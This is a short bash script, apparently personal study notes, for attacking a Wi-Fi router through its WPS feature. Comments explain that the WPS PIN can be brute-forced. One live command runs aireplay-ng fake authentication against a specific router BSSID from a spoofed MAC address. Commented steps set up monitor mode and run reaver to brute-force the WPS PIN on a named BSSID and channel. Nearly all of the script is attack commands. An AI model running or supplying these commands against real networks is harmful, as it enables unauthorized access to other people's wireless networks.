#!/bin/bash

###########################
#       FAKE AUTH         #
###########################


# WPA and WPA2 encryption are improvements over WEP
# Some routers and other devices have WPS buttons that can be exploited
# Instead of having to enter a pass key, WPS generates a 8 digit pin that can be cracked with brute force
# This is a flaw with the router, not WPA itself

# ifconfig wlan1 down
# iwconfig wlan1 mode monitor

# airmon-ng start wlan1


aireplay-ng --fakeauth 0 -a 3C:7A:8A:05:0E:00 -h 00:11:22:33:44:00 wlan1


# reaver -b 2C:30:33:FA:C9:1D -c 8 -i wlan1 -A
# -b bssid
# -c channel
# -i interface

# airmon-ng stop wlan1

# ifconfig wlan0 down
# iwconfig wlan0 mode managed
# ifconfig wlan0 up
